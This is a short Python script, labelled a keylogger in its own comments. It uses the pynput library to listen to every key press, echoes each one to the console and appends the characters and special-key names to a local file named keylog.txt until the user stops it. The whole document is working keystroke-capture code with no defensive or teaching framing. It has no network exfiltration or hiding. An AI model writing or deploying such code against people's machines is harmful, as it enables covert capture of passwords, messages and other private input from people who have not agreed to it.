from pynput import keyboard

# Function to handle key press events
def key_pressed(key):
    # Log the key press to the console
    print(str(key))
    # Open the log file in append mode
    with open("keylog.txt", 'a') as log_file:
        try:
            # Attempt to write the character representation of the key
            log_file.write(key.char)
        except AttributeError:
            # Handle special keys (e.g., Shift, Ctrl) that don't have a char attribute
            log_file.write(f'[{key}]')

# Main function to start the keylogger
def main():
    # Create a keyboard listener
    listener = keyboard.Listener(on_press=key_pressed)
    # Start the listener in a non-blocking manner
    listener.start()
    # Use an infinite loop to keep the program running
    try:
        while True:
            pass
    except KeyboardInterrupt:
        # Stop the listener when the user interrupts (e.g., Ctrl+C)
        listener.stop()

if __name__ == "__main__":
    main()
